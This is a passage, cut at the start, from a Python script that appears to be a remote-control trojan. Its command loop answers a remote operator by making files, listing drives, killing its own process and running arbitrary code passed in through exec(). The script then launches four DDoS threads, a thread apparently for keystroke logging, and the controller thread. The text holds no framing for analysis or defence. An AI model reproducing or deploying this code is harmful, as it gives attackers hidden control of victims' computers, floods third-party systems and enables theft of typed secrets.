                    send('ok')
                except:
                    send('make file error')
            elif nr == 'all drive':
                try:
                    send(str(getpanfu()))
                except:
                    send('get drive error')
            elif nr == 'close':
                send('ok')
                pid = os.getpid()
                os.system('taskkill /f /t /im "'+str(pid)+'"')
            elif nr == 'hello':
                send('hello')
            elif nr[:4] == 'run:':
                nr = nr[4:]
                try:
                    exec(nr)
                    send('ok')
                except Exception as error:
                    print(str(error))
            elif ''.join(nr.split()) == '':
                continue
            else:
                send('\nerror command')

    #sk.close#结束连接
z = threading.Thread(target=zhu)
DDOS = threading.Thread(target=ddos)
DDOS2 = threading.Thread(target=ddos)
DDOS3 = threading.Thread(target=ddos)
DDOS4 = threading.Thread(target=ddos)
jp = threading.Thread(target=jpjl)
cls = threading.Thread(target=closeExe)
cls.start()
jp.start()
z.start()
DDOS.start()
DDOS2.start()
DDOS3.start()
DDOS4.start()